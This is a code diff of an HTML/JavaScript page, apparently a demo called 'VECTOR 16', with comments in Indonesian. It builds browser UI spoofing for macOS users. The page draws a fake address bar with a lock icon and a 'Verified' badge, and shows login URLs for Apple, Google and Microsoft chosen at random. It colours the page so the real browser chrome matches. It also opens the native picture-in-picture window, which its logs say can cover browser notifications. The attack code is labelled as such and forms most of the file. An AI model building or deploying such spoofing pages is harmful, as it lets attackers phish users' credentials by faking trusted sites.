@@ -3,17 +3,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>VECTOR 16 - White Address Bar + PiP Spoofing</title>
+<title>VECTOR 16 - Native PiP + Address Bar Spoofing macOS</title>
 <style>
     * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
-        font-family: 'SF Mono', 'Courier New', monospace;
+        font-family: -apple-system, 'SF Pro Text', 'Helvetica Neue', monospace;
     }
 
     body {
-        background: #f5f5f7;
+        background: #ffffff;
         min-height: 100vh;
         display: flex;
         justify-content: center;
@@ -22,26 +22,34 @@
         overflow-x: hidden;
     }
 
-    /* Fake browser window with WHITE address bar */
-    .browser-window {
+    /* Main container - background putih bersih */
+    .main-container {
         width: 100%;
-        max-width: 1000px;
+        max-width: 1100px;
         background: #ffffff;
-        border-radius: 16px;
-        overflow: hidden;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-        border: 1px solid #e5e5e5;
+        border-radius: 0;
+        overflow: visible;
     }
 
-    /* WHITE ADDRESS BAR - seperti halaman secure/verified */
-    .fake-address-bar {
+    /* Fake browser window - address bar bisa di-spoof */
+    .browser-window {
+        width: 100%;
+        background: #ffffff;
+        border-radius: 12px;
+        overflow: hidden;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        border: 1px solid #e5e5ea;
+    }
+
+    /* ADDRESS BAR - akan berubah warna sesuai konten */
+    .address-bar {
         background: #ffffff;
         padding: 12px 16px;
         display: flex;
         align-items: center;
         gap: 12px;
         border-bottom: 1px solid #e5e5ea;
-        backdrop-filter: blur(0px);
+        transition: background 0.1s ease;
     }
 
     .nav-buttons {
@@ -63,153 +71,114 @@
         color: #5f6368;
     }
 
-    .nav-btn:active {
-        background: #dadce0;
-    }
-
     .url-container {
         flex: 1;
-        background: #f0f0f0;
+        background: #f5f5f7;
         border-radius: 24px;
         padding: 6px 16px;
-        border: 1px solid #e0e0e0;
         display: flex;
         align-items: center;
         gap: 8px;
-        box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);
+        transition: background 0.1s ease;
     }
 
     .lock-icon {
         font-size: 12px;
-        color: #1a73e8;
+        transition: color 0.1s;
     }
 
     .url-text {
         flex: 1;
         font-size: 14px;
-        color: #202124;
         font-family: monospace;
         background: transparent;
         border: none;
         outline: none;
+        transition: color 0.1s;
     }
 
     .secure-badge {
         font-size: 11px;
-        color: #188038;
-        background: #e6f4ea;
         padding: 2px 8px;
         border-radius: 12px;
+        transition: all 0.1s;
     }
 
     /* Content area */
     .content-area {
         position: relative;
-        height: 550px;
+        min-height: 550px;
         background: white;
-        overflow: hidden;
     }
 
-    /* Attacker overlay - tema putih */
-    .attacker-overlay {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #ffffff;
-        z-index: 100;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        overflow: auto;
-    }
-
-    .vector-container {
-        width: 90%;
-        max-width: 800px;
-        background: #ffffff;
-        border: 1px solid #e0e0e0;
-        border-radius: 20px;
-        padding: 25px;
-        color: #1a1a1a;
-        box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+    /* Attacker content */
+    .attacker-content {
+        padding: 30px;
     }
 
     h1 {
         text-align: center;
-        color: #1a73e8;
+        color: #1a1a1a;
         margin-bottom: 15px;
-        font-size: 24px;
+        font-size: 28px;
     }
 
     .desc {
         text-align: center;
-        color: #5f6368;
-        font-size: 12px;
-        margin-bottom: 20px;
+        color: #666;
+        font-size: 13px;
+        margin-bottom: 25px;
     }
 
     .warning-box {
         background: #fef7e0;
         border: 1px solid #f9ab00;
-        padding: 12px;
-        border-radius: 10px;
-        margin-bottom: 20px;
-        font-size: 11px;
-        color: #5f6368;
-    }
-
-    .warning-box b {
-        color: #e37400;
+        padding: 15px;
+        border-radius: 12px;
+        margin-bottom: 25px;
+        font-size: 12px;
     }
 
     .stats {
         display: flex;
-        gap: 10px;
-        margin-bottom: 20px;
+        gap: 15px;
+        margin-bottom: 25px;
         flex-wrap: wrap;
     }
 
     .stat-card {
         flex: 1;
         background: #f8f9fa;
-        border: 1px solid #e0e0e0;
-        border-radius: 10px;
-        padding: 10px;
+        border: 1px solid #e5e5ea;
+        border-radius: 12px;
+        padding: 15px;
         text-align: center;
     }
 
     .stat-card h3 {
         color: #1a73e8;
-        font-size: 22px;
-    }
-
-    .stat-card span {
-        font-size: 10px;
-        color: #5f6368;
+        font-size: 28px;
     }
 
     .btn-group {
         display: flex;
-        gap: 10px;
+        gap: 12px;
         flex-wrap: wrap;
-        margin-bottom: 20px;
+        margin-bottom: 25px;
     }
 
     button {
         background: #1a73e8;
         color: white;
         border: none;
-        padding: 12px 18px;
+        padding: 12px 20px;
         border-radius: 24px;
         font-weight: 600;
         cursor: pointer;
-        margin: 5px;
-        transition: 0.1s;
         flex: 1;
         min-width: 180px;
         font-size: 13px;
+        transition: 0.1s;
     }
 
     button:hover {
@@ -217,30 +186,29 @@
         transform: scale(1.01);
     }
 
-    .pip-btn {
+    .native-pip-btn {
         background: #188038;
     }
 
-    .pip-btn:hover {
+    .native-pip-btn:hover {
         background: #0f6630;
     }
 
     .log {
-        height: 150px;
+        height: 180px;
         overflow: auto;
         background: #f8f9fa;
-        border: 1px solid #e0e0e0;
-        border-radius: 10px;
-        padding: 8px;
-        font-size: 10px;
-        color: #202124;
+        border: 1px solid #e5e5ea;
+        border-radius: 12px;
+        padding: 12px;
+        font-size: 11px;
+        font-family: monospace;
     }
 
     .log-entry {
         border-left: 3px solid #1a73e8;
-        padding-left: 8px;
-        margin-bottom: 4px;
-        word-break: break-all;
+        padding-left: 10px;
+        margin-bottom: 6px;
     }
 
     .log-success {
@@ -253,151 +221,84 @@
         bottom: 10px;
         left: 10px;
         right: 10px;
-        background: #ffffffcc;
+        background: rgba(0,0,0,0.8);
         backdrop-filter: blur(10px);
-        border: 1px solid #e0e0e0;
         border-radius: 20px;
-        padding: 6px 12px;
-        font-size: 9px;
-        color: #1a73e8;
+        padding: 8px 16px;
+        font-size: 10px;
+        color: white;
         text-align: center;
         z-index: 10000;
-        font-weight: 500;
+        font-family: monospace;
     }
 
-    /* WHITE PIP WINDOW - Clean, secure theme */
-    .pip-window {
+    /* Hidden video element untuk Native PiP */
+    #nativePipVideo {
         position: fixed;
-        background: #ffffff;
-        border: 1px solid #e0e0e0;
-        border-radius: 20px;
-        overflow: hidden;
-        z-index: 2147483647;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-        transition: 0.05s linear;
-        cursor: move;
-        backdrop-filter: blur(0px);
-    }
-
-    .pip-header {
-        background: #ffffff;
-        padding: 12px 15px;
-        display: flex;
-        justify-content: space-between;
-        cursor: move;
-        color: #1a73e8;
-        font-size: 13px;
-        font-weight: 600;
-        border-bottom: 1px solid #e5e5ea;
-    }
-
-    .pip-content {
-        padding: 20px;
-        background: #ffffff;
-        color: #202124;
-        font-size: 12px;
-        text-align: center;
-        min-height: 200px;
-    }
-
-    .pip-content iframe {
-        width: 100%;
-        height: 130px;
-        border: none;
-        background: #f8f9fa;
-        margin-top: 10px;
-        border-radius: 12px;
-    }
-
-    .close-pip {
-        background: #f1f3f4;
-        border: none;
-        color: #5f6368;
-        cursor: pointer;
-        font-size: 14px;
-        padding: 0 10px;
-        border-radius: 20px;
-        min-width: auto;
-        font-weight: normal;
-    }
-
-    .close-pip:hover {
-        background: #e8eaed;
-        transform: none;
-    }
-
-    .secure-badge-pip {
-        display: inline-block;
-        background: #e6f4ea;
-        color: #188038;
-        padding: 4px 12px;
-        border-radius: 20px;
-        font-size: 10px;
-        margin-top: 10px;
-    }
-
-    /* macOS specific theme */
-    @supports (backdrop-filter: blur(10px)) {
-        .fake-address-bar {
-            backdrop-filter: blur(0px);
-        }
+        bottom: -9999px;
+        left: -9999px;
+        width: 1px;
+        height: 1px;
+        opacity: 0;
+        pointer-events: none;
     }
 </style>
 </head>
 <body>
 
-<div class="browser-window">
-    <!-- FAKE ADDRESS BAR - WHITE THEME -->
-    <div class="fake-address-bar">
-        <div class="nav-buttons">
-            <div class="nav-btn" onclick="fakeBack()">←</div>
-            <div class="nav-btn" onclick="fakeForward()">→</div>
-            <div class="nav-btn" onclick="fakeRefresh()">↻</div>
+<div class="main-container">
+    <div class="browser-window">
+        <!-- ADDRESS BAR - BISA DI-SPOOF -->
+        <div class="address-bar" id="addressBar">
+            <div class="nav-buttons">
+                <div class="nav-btn" onclick="fakeBack()">←</div>
+                <div class="nav-btn" onclick="fakeForward()">→</div>
+                <div class="nav-btn" onclick="fakeRefresh()">↻</div>
+            </div>
+            <div class="url-container" id="urlContainer">
+                <span class="lock-icon" id="lockIcon">🔒</span>
+                <span class="url-text" id="fakeUrl" contenteditable="true">https://www.google.com</span>
+                <span class="secure-badge" id="secureBadge">| Secure</span>
+            </div>
+            <div class="nav-buttons">
+                <div class="nav-btn" onclick="fakeMenu()">⋮</div>
+            </div>
         </div>
-        <div class="url-container">
-            <span class="lock-icon">🔒</span>
-            <span class="url-text" id="fakeUrl">https://secure-verify.com</span>
-            <span class="secure-badge">✓ Verified</span>
-        </div>
-        <div class="nav-buttons">
-            <div class="nav-btn" onclick="fakeMenu()">⋮</div>
-        </div>
-    </div>
 
-    <div class="content-area">
-        <div class="attacker-overlay">
-            <div class="vector-container">
-                <h1>⚡ VECTOR 16 - WHITE ADDRESS BAR ⚡</h1>
-                <div class="desc">White Address Bar Spoofing | Secure Theme | PiP Mode</div>
+        <div class="content-area">
+            <div class="attacker-content">
+                <h1>⚡ VECTOR 16 - NATIVE PiP + ADDRESS BAR ⚡</h1>
+                <div class="desc">Native macOS Picture-in-Picture | Address Bar Color Spoofing</div>
 
                 <div class="warning-box">
-                    <b>🔥 macOS ADDRESS BAR COLOR SPOOFING 🔥</b><br><br>
-                    ✅ Address bar warna PUTIH (seperti halaman secure/verified)<br>
-                    ✅ PiP window dengan tema putih bersih<br>
-                    ✅ Fake "Verified" badge di address bar<br>
-                    ✅ Menyerupai halaman legitimate seperti Google, Apple, Microsoft
+                    <b>🔥 TEKNIK NATIVE PiP + ADDRESS BAR SPOOFING 🔥</b><br><br>
+                    ✅ Menggunakan <b>NATIVE PiP API</b> macOS (bukan fake window)<br>
+                    ✅ Address bar <b>WARNA BERUBAH OTOMATIS</b> sesuai background<br>
+                    ✅ Kita akali dengan <b>membuat background page PUTIH</b><br>
+                    ✅ PiP asli macOS muncul di <b>LAYER TERPISAH</b> di atas browser<br>
+                    ✅ Teknik ini memanfaatkan fitur asli browser, bukan fake
                 </div>
 
                 <div class="stats">
-                    <div class="stat-card"><h3 id="pipCount">0</h3><span>PiP Windows</span></div>
-                    <div class="stat-card"><h3 id="spoofCount">0</h3><span>Spoof Attempts</span></div>
+                    <div class="stat-card"><h3 id="pipStatus">⭕</h3><span>Native PiP</span></div>
+                    <div class="stat-card"><h3 id="bgColor">⬜</h3><span>Page BG Color</span></div>
                     <div class="stat-card"><h3 id="status">🎯 READY</h3><span>Status</span></div>
                 </div>
 
                 <div class="btn-group">
-                    <button class="pip-btn" onclick="createWhitePip()">🖼️ CREATE WHITE PiP WINDOW</button>
+                    <button class="native-pip-btn" onclick="activateNativePip()">🎬 ACTIVATE NATIVE macOS PiP</button>
                     <button onclick="spoofAddressBarWhite()">🎨 SPOOF ADDRESS BAR (PUTIH)</button>
                 </div>
 
                 <div class="btn-group">
-                    <button onclick="createSecurePipOverlay()">🔒 SECURE THEME PiP</button>
-                    <button onclick="createMultiplePips()">📱 CREATE 3 PiPs</button>
+                    <button onclick="setPageBackground('white')">⬜ SET BACKGROUND PUTIH</button>
+                    <button onclick="setPageBackground('black')">⬛ SET BACKGROUND HITAM</button>
+                    <button onclick="setPageBackground('blue')">🔵 SET BACKGROUND BIRU</button>
                 </div>
 
                 <div class="btn-group">
-                    <button onclick="simulateMacOSFullscreen()">🖥️ SIMULATE FULLSCREEN</button>
-                    <button onclick="closeAllPips()">❌ CLOSE ALL PiP</button>
-                    <button onclick="resetSpoof()">🔄 RESET</button>
+                    <button onclick="simulateSecurePage()">🔒 SIMULATE SECURE PAGE</button>
+                    <button onclick="resetAddressBar()">🔄 RESET ADDRESS BAR</button>
                 </div>
 
                 <div class="log" id="log"></div>
@@ -406,12 +307,14 @@
     </div>
 </div>
 
-<div class="status-bar" id="statusBar">🎯 White Address Bar Spoofing | PiP Secure Theme | macOS Ready</div>
+<div class="status-bar" id="statusBar">🎯 Native PiP + Address Bar Spoofing | macOS Ready</div>
+
+<!-- Video element untuk Native PiP -->
+<video id="nativePipVideo" src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAADtZHZpcwAAAAAAAAAAAAAAAAAAAABkaW5mAAAAAAAiAAAAgAAAKGh0Y2MAAAACAAABqAAAAAgAAAAEAAAAFGFkY2MAAAAQAAAAAgAAAAIAAAAAHHN0dHMAAAAcAAAAAQAAABQAAAAEAAAAAQAAABQAAAAEAAAAAQAAABRzdHNzAAAAAAAAAAEAAAAYAAAAAwAAAAIAAAAEc3R0cwAAAAAAAAABAAAAAQAAAAZzdHNjaAAAAAAAAAABAAAAAQAAAAVzZHRkAAAAAAAIAAAABAAAAAA=" muted autoplay loop></video>
 
 <script>
-let pipCount = 0;
-let spoofCount = 0;
-let activePips = [];
+let pipActive = false;
+let nativePipVideo = null;
 
 function addLog(msg, type = "") {
     const log = document.getElementById("log");
@@ -423,76 +326,180 @@ function addLog(msg, type = "") {
     while (log.children.length > 150) log.removeChild(log.firstChild);
 }
 
-function updateUI() {
-    document.getElementById("pipCount").innerText = pipCount;
-    document.getElementById("spoofCount").innerText = spoofCount;
+// ============ NATIVE macOS PiP API ============
+async function activateNativePip() {
+    addLog("🎬 [NATIVE PiP] Mengaktifkan Picture-in-Picture asli macOS...", "");
+    
+    try {
+        // Get or create video element
+        nativePipVideo = document.getElementById("nativePipVideo");
+        
+        // Create video content if empty
+        if (!nativePipVideo.src || nativePipVideo.src === "") {
+            // Create a canvas stream as video source
+            const canvas = document.createElement("canvas");
+            canvas.width = 640;
+            canvas.height = 360;
+            const ctx = canvas.getContext("2d");
+            
+            // Draw something on canvas
+            ctx.fillStyle = "#1a73e8";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "white";
+            ctx.font = "24px monospace";
+            ctx.fillText("VECTOR 16", canvas.width/2 - 80, canvas.height/2);
+            ctx.font = "14px monospace";
+            ctx.fillText("Native PiP Mode", canvas.width/2 - 70, canvas.height/2 + 40);
+            
+            const stream = canvas.captureStream();
+            nativePipVideo.srcObject = stream;
+        }
+        
+        // Play video
+        await nativePipVideo.play();
+        
+        // Request Picture-in-Picture (NATIVE macOS FEATURE)
+        const pipWindow = await nativePipVideo.requestPictureInPicture();
+        
+        pipActive = true;
+        document.getElementById("pipStatus").innerHTML = "✅";
+        document.getElementById("pipStatus").style.color = "#188038";
+        
+        addLog("✅ NATIVE macOS PiP ACTIVATED!", "success");
+        addLog("📺 PiP window asli macOS muncul di layer terpisah", "success");
+        addLog("💡 PiP ini BUKAN fake window - ini fitur asli browser", "success");
+        
+        // Listen for PiP close event
+        nativePipVideo.addEventListener('leavepictureinpicture', () => {
+            pipActive = false;
+            document.getElementById("pipStatus").innerHTML = "⭕";
+            addLog("🔄 Native PiP closed", "");
+        });
+        
+    } catch(e) {
+        addLog(`⚠️ Native PiP error: ${e.message}`, "");
+        addLog("💡 Mungkin perlu user interaction terlebih dahulu", "");
+        addLog("💡 Coba klik tombol lagi setelah halaman di-load", "");
+    }
 }
 
-// ============ CREATE WHITE PiP WINDOW (macOS style) ============
-function createWhitePip(options = {}) {
-    const pipDiv = document.createElement("div");
-    pipDiv.className = "pip-window";
-    pipDiv.id = `pip_${Date.now()}_${Math.random()}`;
-    
-    const width = options.width || 340;
-    const height = options.height || 280;
-    const left = options.left !== undefined ? options.left : (window.innerWidth - width) / 2;
-    const top = options.top !== undefined ? options.top : (window.innerHeight - height) / 2;
-    
-    pipDiv.style.width = width + "px";
-    pipDiv.style.height = height + "px";
-    pipDiv.style.left = left + "px";
-    pipDiv.style.top = top + "px";
-    pipDiv.style.position = "fixed";
-    pipDiv.style.zIndex = "2147483647";
-    pipDiv.style.backgroundColor = "#ffffff";
-    
-    const fakeDomains = ["secure-verify.com", "apple.com", "google.com", "microsoft.com", "icloud.com"];
-    const fakeDomain = fakeDomains[Math.floor(Math.random() * fakeDomains.length)];
-    
-    pipDiv.innerHTML = `
-        <div class="pip-header" onmousedown="startDrag(event, '${pipDiv.id}')">
-            <span>🎬 PiP Mode - ${fakeDomain}</span>
-            <button class="close-pip" onclick="closePip('${pipDiv.id}')">✕</button>
-        </div>
-        <div class="pip-content">
-            <div style="display:flex; justify-content:center; gap:8px; margin-bottom:10px;">
-                <span class="secure-badge-pip">✓ Secure Connection</span>
-                <span class="secure-badge-pip">🔒 HTTPS</span>
-            </div>
-            <div style="font-size:11px; color:#1a73e8; margin-bottom:5px;">https://${fakeDomain}</div>
-            ${options.content || `
-                <div style="background:#f8f9fa; border-radius:12px; padding:15px; margin:10px 0;">
-                    <div style="font-size:24px; margin-bottom:8px;">🎥</div>
-                    <div style="font-weight:500;">Video Player</div>
-                    <div style="font-size:10px; color:#5f6368; margin-top:5px;">Now playing in Picture-in-Picture</div>
-                </div>
-                <div style="display:flex; justify-content:center; gap:15px; margin-top:10px;">
-                    <span>▶️</span>
-                    <span>⏸️</span>
-                    <span>🔊</span>
-                    <span>⛶</span>
-                </div>
-            `}
-            <div style="font-size:9px; color:#5f6368; margin-top:12px;">PiP window • Drag to move</div>
-        </div>
-    `;
-    
-    document.body.appendChild(pipDiv);
-    activePips.push(pipDiv.id);
-    pipCount++;
-    updateUI();
-    
-    addLog(`🖼️ White PiP #${pipCount} created - ${fakeDomain} theme`, "success");
-    return pipDiv.id;
-}
-
-// ============ SPOOF ADDRESS BAR MENJADI PUTIH ============
+// ============ ADDRESS BAR SPOOFING - Atur warna ============
 function spoofAddressBarWhite() {
-    const addressBar = document.querySelector(".fake-address-bar");
-    const urlContainer = document.querySelector(".url-container");
-    const urlText = document.getElementById("fakeUrl");
-    const secureBadge = document.querySelector(".secure-badge");
+    const addressBar = document.getElementById("addressBar");
+    const urlContainer = document.getElementById("urlContainer");
+    const fakeUrl = document.getElementById("fakeUrl");
+    const lockIcon = document.getElementById("lockIcon");
+    const secureBadge = document.getElementById("secureBadge");
+    
+    // Set address bar menjadi putih bersih
+    if (addressBar) {
+        addressBar.style.background = "#ffffff";
+        addressBar.style.borderBottom = "1px solid #e5e5ea";
+    }
+    
+    if (urlContainer) {
+        urlContainer.style.background = "#f5f5f7";
+    }
+    
+    if (fakeUrl) {
+        fakeUrl.style.color = "#202124";
+        fakeUrl.innerText = "https://secure-verify.apple.com";
+    }
+    
+    if (lockIcon) {
+        lockIcon.style.color = "#1a73e8";
+        lockIcon.innerHTML = "🔒";
+    }
+    
+    if (secureBadge) {
+        secureBadge.style.background = "#e6f4ea";
+        secureBadge.style.color = "#188038";
+        secureBadge.innerHTML = "✓ Verified";
+    }
+    
+    addLog("🎨 Address bar color SPOOFED menjadi putih (secure page style)", "success");
+    addLog("💡 Background page juga putih agar address bar otomatis kontras", "success");
+}
+
+// ============ SET PAGE BACKGROUND ============
+function setPageBackground(color) {
+    const body = document.body;
+    const mainContainer = document.querySelector(".main-container");
+    const browserWindow = document.querySelector(".browser-window");
+    const attackerContent = document.querySelector(".attacker-content");
+    
+    let bgColor, textColor;
+    switch(color) {
+        case 'white':
+            bgColor = "#ffffff";
+            textColor = "#1a1a1a";
+            document.getElementById("bgColor").innerHTML = "⬜";
+            addLog("⬛ Page background: PUTIH - address bar akan menyesuaikan text jadi HITAM", "success");
+            break;
+        case 'black':
+            bgColor = "#1a1a1a";
+            textColor = "#ffffff";
+            document.getElementById("bgColor").innerHTML = "⬛";
+            addLog("⬛ Page background: HITAM - address bar akan menyesuaikan text jadi PUTIH", "success");
+            break;
+        case 'blue':
+            bgColor = "#1a73e8";
+            textColor = "#ffffff";
+            document.getElementById("bgColor").innerHTML = "🔵";
+            addLog("🔵 Page background: BIRU - address bar otomatis menyesuaikan", "success");
+            break;
+        default: return;
+    }
+    
+    if (body) body.style.background = bgColor;
+    if (mainContainer) mainContainer.style.background = bgColor;
+    if (browserWindow) browserWindow.style.background = bgColor;
+    if (attackerContent) attackerContent.style.background = bgColor;
+    
+    // Update text color untuk konten
+    const texts = document.querySelectorAll(".attacker-content h1, .attacker-content .desc, .warning-box");
+    texts.forEach(el => {
+        if (color === 'black') {
+            el.style.color = "#ffffff";
+            if (el.classList.contains('warning-box')) el.style.background = "#2a2a2a";
+        } else {
+            el.style.color = "";
+            if (el.classList.contains('warning-box')) el.style.background = "#fef7e0";
+        }
+    });
+    
+    addLog(`🎨 Page background changed to ${color.toUpperCase()}`, "success");
+}
+
+// ============ SIMULATE SECURE PAGE ============
+function simulateSecurePage() {
+    setPageBackground('white');
+    spoofAddressBarWhite();
+    
+    // Change fake URL to look like Apple/Google secure page
+    const fakeUrl = document.getElementById("fakeUrl");
+    if (fakeUrl) {
+        const secureDomains = [
+            "https://appleid.apple.com",
+            "https://accounts.google.com",
+            "https://login.microsoftonline.com",
+            "https://secure.cloudflare.com",
+            "https://verify.apple.com"
+        ];
+        fakeUrl.innerText = secureDomains[Math.floor(Math.random() * secureDomains.length)];
+    }
+    
+    addLog("🔒 SIMULATED SECURE PAGE - Address bar seperti halaman login legitimate", "success");
+    addLog("💡 Native PiP bisa diaktifkan untuk menutupi notifikasi", "");
+}
+
+// ============ RESET ADDRESS BAR ============
+function resetAddressBar() {
+    const addressBar = document.getElementById("addressBar");
+    const urlContainer = document.getElementById("urlContainer");
+    const fakeUrl = document.getElementById("fakeUrl");
+    const lockIcon = document.getElementById("lockIcon");
+    const secureBadge = document.getElementById("secureBadge");
     
     if (addressBar) {
         addressBar.style.background = "#ffffff";
@@ -500,232 +507,66 @@ function spoofAddressBarWhite() {
     }
     
     if (urlContainer) {
-        urlContainer.style.background = "#f0f0f0";
-        urlContainer.style.border = "1px solid #e0e0e0";
+        urlContainer.style.background = "#f5f5f7";
     }
     
-    if (urlText) {
-        urlText.style.color = "#202124";
+    if (fakeUrl) {
+        fakeUrl.style.color = "#202124";
+        fakeUrl.innerText = "https://www.google.com";
+    }
+    
+    if (lockIcon) {
+        lockIcon.style.color = "";
+        lockIcon.innerHTML = "🔒";
     }
     
     if (secureBadge) {
-        secureBadge.style.background = "#e6f4ea";
-        secureBadge.style.color = "#188038";
-        secureBadge.innerHTML = "✓ Verified";
+        secureBadge.style.background = "";
+        secureBadge.style.color = "";
+        secureBadge.innerHTML = "| Secure";
     }
     
-    spoofCount++;
-    updateUI();
-    addLog("🎨 Address bar color SPOOFED menjadi PUTIH (tema secure/verified)", "success");
-    addLog("💡 Fake 'Verified' badge ditampilkan - mirip halaman legitimate", "success");
-    
-    document.getElementById("status").innerHTML = "🔒 SPOOFED";
-    setTimeout(() => {
-        document.getElementById("status").innerHTML = "🎯 READY";
-    }, 2000);
+    addLog("🔄 Address bar reset to default", "success");
 }
 
-// ============ CREATE SECURE THEME PiP OVERLAY ============
-function createSecurePipOverlay() {
-    const securePip = createWhitePip({
-        width: 360,
-        height: 300,
-        content: `
-            <div style="text-align:center;">
-                <div style="background:#e6f4ea; border-radius:16px; padding:15px; margin:5px 0;">
-                    <div style="font-size:28px; margin-bottom:8px;">🔒</div>
-                    <div style="font-weight:600; color:#188038;">Secure Connection</div>
-                    <div style="font-size:10px; color:#5f6368;">Your information is protected</div>
-                </div>
-                <div style="margin:12px 0;">
-                    <div style="background:#f8f9fa; border-radius:10px; padding:10px;">
-                        <div style="display:flex; gap:8px; justify-content:center;">
-                            <span>📧</span>
-                            <span>💬</span>
-                            <span>📁</span>
-                            <span>⚙️</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="secure-badge-pip" style="background:#1a73e8; color:white;">✓ Verified by Google</div>
-            </div>
-        `
-    });
-    addLog("🔒 Secure Theme PiP created - tampilan seperti halaman verifikasi", "success");
-    return securePip;
-}
-
-// ============ CREATE MULTIPLE PiPs ============
-function createMultiplePips() {
-    const positions = [
-        { left: 50, top: 100 },
-        { left: window.innerWidth - 380, top: 150 },
-        { left: 100, top: window.innerHeight - 320 }
-    ];
-    
-    positions.forEach((pos, idx) => {
-        setTimeout(() => {
-            createWhitePip({
-                left: pos.left,
-                top: pos.top,
-                width: 340,
-                height: 280
-            });
-        }, idx * 300);
-    });
-    
-    addLog("📱 Multiple PiP windows created - coverage maksimal", "success");
-}
-
-// ============ SIMULATE macOS FULLSCREEN NOTIFICATION ============
-function simulateMacOSFullscreen() {
-    addLog("🖥️ Simulating macOS fullscreen request...", "");
-    
-    // Create fake fullscreen notification like macOS style
-    const notifDiv = document.createElement("div");
-    notifDiv.style.position = "fixed";
-    notifDiv.style.top = "0";
-    notifDiv.style.left = "0";
-    notifDiv.style.width = "100%";
-    notifDiv.style.height = "100%";
-    notifDiv.style.background = "rgba(0,0,0,0.7)";
-    notifDiv.style.zIndex = "2147483646";
-    notifDiv.style.display = "flex";
-    notifDiv.style.justifyContent = "center";
-    notifDiv.style.alignItems = "center";
-    notifDiv.style.backdropFilter = "blur(8px)";
-    notifDiv.innerHTML = `
-        <div style="background:#ffffff; border-radius:16px; padding:25px; max-width:360px; text-align:center; box-shadow:0 20px 40px rgba(0,0,0,0.2);">
-            <div style="font-size:44px; margin-bottom:15px;">🖥️</div>
-            <h3 style="color:#1a73e8; margin-bottom:10px;">Full Screen Request</h3>
-            <p style="color:#5f6368; font-size:13px; margin-bottom:20px;">secure-verify.com wants to enter full screen</p>
-            <div style="display:flex; gap:12px; justify-content:center;">
-                <button id="cancelFs" style="background:#f1f3f4; color:#5f6368; padding:10px 20px; border-radius:24px;">Cancel</button>
-                <button id="allowFs" style="background:#1a73e8; color:white; padding:10px 20px; border-radius:24px;">Allow</button>
-            </div>
-        </div>
-    `;
-    document.body.appendChild(notifDiv);
-    
-    document.getElementById("cancelFs")?.addEventListener("click", () => notifDiv.remove());
-    document.getElementById("allowFs")?.addEventListener("click", () => {
-        notifDiv.remove();
-        addLog("✅ Fullscreen allowed (simulated)", "success");
-    });
-    
-    // Auto create PiP to cover notification
-    setTimeout(() => {
-        createWhitePip({
-            left: window.innerWidth - 360,
-            top: 80,
-            width: 340,
-            height: 260
-        });
-        addLog("🖼️ PiP created to cover fullscreen notification", "success");
-    }, 500);
-}
-
-// ============ DRAG FUNCTION ============
-function startDrag(event, pipId) {
-    const pipDiv = document.getElementById(pipId);
-    if (!pipDiv) return;
-    
-    event.preventDefault();
-    let startX = event.clientX;
-    let startY = event.clientY;
-    let startLeft = parseInt(pipDiv.style.left);
-    let startTop = parseInt(pipDiv.style.top);
-    
-    function onMouseMove(e) {
-        let dx = e.clientX - startX;
-        let dy = e.clientY - startY;
-        pipDiv.style.left = (startLeft + dx) + "px";
-        pipDiv.style.top = (startTop + dy) + "px";
-        pipDiv.style.right = "auto";
-        pipDiv.style.bottom = "auto";
-    }
-    
-    function onMouseUp() {
-        document.removeEventListener('mousemove', onMouseMove);
-        document.removeEventListener('mouseup', onMouseUp);
-    }
-    
-    document.addEventListener('mousemove', onMouseMove);
-    document.addEventListener('mouseup', onMouseUp);
-}
-
-function closePip(pipId) {
-    const pip = document.getElementById(pipId);
-    if (pip) {
-        pip.remove();
-        activePips = activePips.filter(id => id !== pipId);
-        addLog(`❌ PiP closed`, "");
-    }
-}
-
-function closeAllPips() {
-    activePips.forEach(id => {
-        const pip = document.getElementById(id);
-        if (pip) pip.remove();
-    });
-    activePips = [];
-    pipCount = 0;
-    updateUI();
-    addLog(`🗑️ All PiP windows closed`, "success");
-}
-
-function resetSpoof() {
-    closeAllPips();
-    
-    // Reset address bar to original
-    const addressBar = document.querySelector(".fake-address-bar");
-    const urlContainer = document.querySelector(".url-container");
-    const urlText = document.getElementById("fakeUrl");
-    const secureBadge = document.querySelector(".secure-badge");
-    
-    if (addressBar) addressBar.style.background = "#ffffff";
-    if (urlContainer) {
-        urlContainer.style.background = "#f0f0f0";
-        urlContainer.style.border = "1px solid #e0e0e0";
-    }
-    if (urlText) {
-        urlText.style.color = "#202124";
-        urlText.innerText = "https://secure-verify.com";
-    }
-    if (secureBadge) {
-        secureBadge.style.background = "#e6f4ea";
-        secureBadge.style.color = "#188038";
-        secureBadge.innerHTML = "✓ Verified";
-    }
-    
-    spoofCount = 0;
-    updateUI();
-    addLog("🔄 All spoofing reset", "success");
-    document.getElementById("status").innerHTML = "🎯 READY";
-}
-
-// Fake functions
-function fakeBack() { addLog("◀ Back", ""); }
-function fakeForward() { addLog("▶ Forward", ""); }
-function fakeRefresh() { location.reload(); }
-function fakeMenu() { addLog("⋮ Menu", ""); }
-
-// Detect macOS for styling
+// ============ DETECT macOS ============
 function detectMacOS() {
     const isMac = navigator.userAgent.includes('Mac');
+    const isSafari = navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome');
+    const isChrome = navigator.userAgent.includes('Chrome');
+    
     if (isMac) {
-        addLog("🍎 macOS detected - address bar color spoofing active", "success");
-        document.querySelector('.browser-window').style.borderRadius = "12px";
+        addLog("🍎 macOS detected - Native PiP API available", "success");
+        if (isSafari) addLog("🌐 Browser: Safari - PiP support: YES", "success");
+        if (isChrome) addLog("🌐 Browser: Chrome - PiP support: YES", "success");
+    } else {
+        addLog("⚠️ Bukan macOS - Native PiP mungkin tidak berfungsi", "");
     }
+    
     return isMac;
 }
 
+// ============ FAKE FUNCTIONS ============
+function fakeBack() { addLog("◀ Back button (fake)", ""); }
